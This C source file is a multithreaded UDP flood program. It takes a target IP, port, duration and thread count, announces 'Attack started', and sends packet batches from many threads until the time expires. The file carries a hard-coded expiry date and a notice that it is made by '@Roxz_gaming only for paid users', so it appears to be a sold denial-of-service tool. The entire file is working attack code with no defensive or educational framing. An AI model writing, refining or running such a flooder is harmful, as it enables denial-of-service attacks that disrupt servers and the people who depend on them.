#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>

#define BUFFER_SIZE 900
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 1
#define EXPIRATION_DAY 1

char *ip;
int port;
int duration;
int stopFlag = 0;
pthread_mutex_t stopMutex = PTHREAD_MUTEX_INITIALIZER;

void checkExpiration() {
    time_t currentTime = time(NULL);
    struct tm expirationDate = {0};
    expirationDate.tm_year = EXPIRATION_YEAR - 1900;
    expirationDate.tm_mon = EXPIRATION_MONTH - 1;
    expirationDate.tm_mday = EXPIRATION_DAY;
    time_t expirationTime = mktime(&expirationDate);

    if (currentTime > expirationTime) {
        fprintf(stderr, "This file is closed by @Roxz_gaming.\n");
        exit(1);
    }
}

void *sendUDPTraffic(void *userID) {
    int userIDValue = *(int *)userID;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "User %d: Failed to create socket\n", userIDValue);
        return NULL;
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serverAddr.sin_addr);

    char buffer[BUFFER_SIZE] = "UDP traffic test";
    time_t endTime = time(NULL) + duration;

    while (time(NULL) < endTime) {
        pthread_mutex_lock(&stopMutex);
        if (stopFlag) {
            pthread_mutex_unlock(&stopMutex);
            break;
        }
        pthread_mutex_unlock(&stopMutex);

        // Batch send packets
        for (int i = 0; i < 10; i++) { // You can experiment with this number
            int sendResult = sendto(sockfd, buffer, strlen(buffer), 0,
                                    (struct sockaddr *)&serverAddr, sizeof(serverAddr));
            if (sendResult < 0) {
                fprintf(stderr, "User %d: Send failed\n", userIDValue);
            }
        }
    }

    close(sockfd);
    return NULL;
}

void *expirationCheckThread(void *arg) {
    while (1) {
        pthread_mutex_lock(&stopMutex);
        if (stopFlag) {
            pthread_mutex_unlock(&stopMutex);
            break;
        }
        pthread_mutex_unlock(&stopMutex);
        checkExpiration();
        sleep(1 * 60 * 60); // Check every hour
    }
    return NULL;
}

void signalHandler(int signal) {
    pthread_mutex_lock(&stopMutex);
    stopFlag = 1;
    pthread_mutex_unlock(&stopMutex);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    checkExpiration();

    // Print attack parameters
    printf("Attack started\n");
    printf("IP: %s\n", ip);
    printf("PORT: %d\n", port);
    printf("TIME: %d seconds\n", duration);
    printf("THREADS: %d\n", threads);
    printf("File is made by @Roxz_gaming only for paid users.\n");

    pthread_t expirationThread;
    pthread_create(&expirationThread, NULL, expirationCheckThread, NULL);

    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    pthread_t threadsArray[threads];
    int userIDs[threads];
    for (int i = 0; i < threads; i++) {
        userIDs[i] = i;
        pthread_create(&threadsArray[i], NULL, sendUDPTraffic, &userIDs[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(threadsArray[i], NULL);
    }

    pthread_join(expirationThread, NULL);

    return 0;
}